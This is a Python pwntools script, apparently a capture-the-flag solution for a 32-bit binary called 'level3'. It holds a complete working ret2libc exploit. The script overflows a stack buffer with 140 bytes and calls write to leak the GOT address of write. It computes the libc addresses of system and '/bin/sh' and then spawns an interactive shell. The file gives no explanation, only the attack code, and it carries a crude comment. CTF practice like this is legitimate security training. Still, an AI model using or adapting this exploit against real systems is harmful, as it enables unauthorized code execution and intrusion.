# -*- coding=utf-8 -*-
from pwn import *

libc = ELF("/lib32/libc.so.6")
#libc = ELF("./libc_32.so.6")
elf = ELF("./level3")
     

io = process("./level3")     
#io = remote("111.198.29.45",35638)     
payload = b"A"*140 #+b"A"*4    
write_addr = p32(elf.symbols[b'write'])

back_to_vul = p32(elf.symbols[b'vulnerable_function'])

param_1 = p32(0x1)
param_2 = p32(elf.got[b"write"])
param_3 = p32(0x4)

payload += write_addr + back_to_vul + param_1+param_2+param_3

print(io.read())
io.sendline(payload)

got_write_address = u32(io.recv(4))

print(got_write_address)
#print(io.read())


sh_addr = next(libc.search(b"/bin/sh"))
#fuck generator

system_addr = libc.symbols[b"system"]
write_addr = libc.symbols[b"write"]

write_sh_offset = write_addr - sh_addr
write_system_offset = write_addr - system_addr

sh = got_write_address - write_sh_offset
system = got_write_address - write_system_offset


print(io.read())

payload = b"B"*140 


print(hex(system))
print(hex(sh))
print(p32(system))
payload += p32(system) + p32(0xcafebabe) + p32(sh)

io.sendline(payload)
io.interactive()


 
            





